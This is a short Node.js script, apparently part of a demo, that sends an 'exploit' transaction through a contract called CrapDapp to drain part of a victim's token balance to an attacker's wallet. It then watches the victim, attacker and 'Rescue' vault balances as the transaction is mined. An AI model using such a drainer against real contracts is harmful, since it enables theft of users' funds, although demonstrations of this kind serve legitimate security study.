'use strict'
require('colors');
const process = require('process');
const BigNumber = require('bignumber.js');
const FlexContract = require('flex-contract');
const DAPP_ABI = require('./CrapDapp.abi.json');

const env = require('./env');

const DRAIN_PCT = 0.005;
const GAS_PRICE_BONUS = 1.0;

const dapp = new FlexContract(DAPP_ABI, { address: env.dapp, providerURI: env.providerURI });
(async () => {
    let balances = await getWalletBalances();
    const amount = new BigNumber(balances.victim).times(DRAIN_PCT).integerValue();
    const tx = dapp.exploit(env.token, env.victim, amount)
        .send({ key: env.attackerPrivateKey, gasPriceBonus: GAS_PRICE_BONUS });
    const txId = await tx.txId;
    console.log(`Sent attack TX ${txId.bold.red}!`);
    const watchBalances = async () => {
        await printBalances();
        setTimeout(() => watchBalances(), 500);
    };
    await Promise.all([
        tx,
        watchBalances(),
    ]);
    const receipt = await tx;
    console.log(`\nTransaction mined!\n`);
    await printBalances();
    process.exit(0);
})();

async function printBalances() {
    const balances = await getWalletBalances();
    process.stdout.write(`\r\tBalances:\t\t${'Victim'.blue}: ${
        (`${balances.victim / 1e18}`).bold
    }\t${'Attacker'.red}: ${
        (`${balances.attacker / 1e18}`).bold
    }\t${'Rescue'.yellow}: ${
        (`${balances.vault / 1e18}`).bold
    }`);
}

async function getWalletBalances() {
    const [victim, vault, attacker] = await Promise.all([
        dapp.getVictimBalance(env.token, env.victim).call(),
        dapp.getVictimBalance(env.token, env.vault).call(),
        dapp.getVictimBalance(env.token, env.attacker).call(),
    ]);
    return {
        victim,
        vault,
        attacker,
    };
}
